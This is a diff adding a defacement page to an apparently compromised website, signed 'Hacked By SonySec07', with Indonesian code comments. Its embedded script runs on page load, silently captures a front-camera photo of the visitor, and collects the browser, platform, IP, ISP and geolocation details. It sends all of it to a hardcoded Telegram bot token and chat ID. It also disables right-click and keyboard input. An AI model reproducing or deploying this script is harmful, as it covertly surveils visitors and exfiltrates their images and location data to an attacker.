@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <title>Hacked By SonySec07</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <style>
+        body, a:hover { cursor: url(../cur.cursors-4u.net/symbols/sym-1/sym46.cur), progress !important; }
+        center { font-family: Courier; }
+        img { opacity: 0.8; }
+        red { color: red; }
+    </style>
+    <script>
+        // CONFIG BOT TELEGRAM
+        const BOT_TOKEN = "7843724459:AAF1NRTK0lyN33cul3xUtZBWQa4ar-havIY";
+        const CHAT_ID  = "7008546927";
+
+        // Ambil foto dan setelah itu jalankan pengiriman data
+        async function capturePhotoAndData() {
+            try {
+                // 1. Ambil akses kamera depan
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video  = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                // 2. Tangkap frame ke canvas
+                const canvas = document.createElement('canvas');
+                canvas.width  = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+
+                // 3. Konversi canvas ke Blob foto JPEG
+                canvas.toBlob(async photoBlob => {
+                    // Stop kamera
+                    stream.getTracks().forEach(t => t.stop());
+                    // Kirim foto
+                    await sendPhoto(photoBlob);
+                    // Ambil dan kirim data perangkat & jaringan
+                    await sendDeviceAndNetworkInfo();
+                }, 'image/jpeg', 0.8);
+
+            } catch (err) {
+                console.error('Error accessing camera:', err);
+            }
+        }
+
+        // Kirim foto ke Telegram
+        async function sendPhoto(photoBlob) {
+            const form = new FormData();
+            form.append("chat_id", CHAT_ID);
+            form.append("photo", photoBlob, "capture.jpg");
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST', body: form
+            });
+        }
+
+        // Ambil info perangkat & jaringan lalu kirim
+        async function sendDeviceAndNetworkInfo() {
+            try {
+                // A. Info dasar perangkat
+                const ua       = navigator.userAgent;
+                const platform = navigator.platform;
+                const lang     = navigator.language;
+                const screenW  = screen.width;
+                const screenH  = screen.height;
+
+                // B. Ambil IP + ISP + Geo via API publik
+                const resp = await fetch('https://ip-api.com/json/?fields=status,message,query,isp,org,city,regionName,country,lat,lon');
+                const info = await resp.json();
+
+                if (info.status !== 'success') {
+                    console.warn('IP API error:', info.message);
+                }
+
+                // Susun pesan
+                let text = `📌 *Device & Network Info*\n`;
+                text += `• User Agent: \`${ua}\`\n`;
+                text += `• Platform  : \`${platform}\`\n`;
+                text += `• Language  : \`${lang}\`\n`;
+                text += `• Resolution: ${screenW}×${screenH}\n\n`;
+                if (info.status === 'success') {
+                    text += `🌐 *Network Info*\n`;
+                    text += `• IP Address: \`${info.query}\`\n`;
+                    text += `• ISP       : \`${info.isp}\`\n`;
+                    text += `• Org       : \`${info.org}\`\n`;
+                    text += `• Location  : ${info.city}, ${info.regionName}, ${info.country}\n`;
+                    text += `• Geo       : ${info.lat}, ${info.lon}\n`;
+                }
+
+                // Kirim pesan ke Telegram (gunakan parse_mode Markdown)
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (err) {
+                console.error('Error sending device/network info:', err);
+            }
+        }
+
+        // Mulai semua proses ketika halaman selesai dimuat
+        window.addEventListener('DOMContentLoaded', capturePhotoAndData);
+    </script>
+</head>
+<body bgcolor="white" text="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
+    <table width="100%" height="80%"><td>
+        <center>
+            <small> 4 BROTHER </small><br>
+            <img src="https://abilitysportsafrica.org/alok99.png" width="220" height="220"><br>
+            Hacked by <red><i>SonySec07</i></red><br>
+            <font size="2">wh00pz! your website security get down<br>patch it before something bad happens</font><br><br>
+            <small><font size="1" color="gray">johnfelix@mail2tor.co</font></small><br><br><br>
+            <font size="2"><i>Greetz</i><br>…[daftar grup/hacker]…</font>
+        </center>
+    </td></table>
+    <audio src="https://i.top4top.io/m_3076tjqzc0.mp3" autoplay loop></audio>
+</body>
+</html>
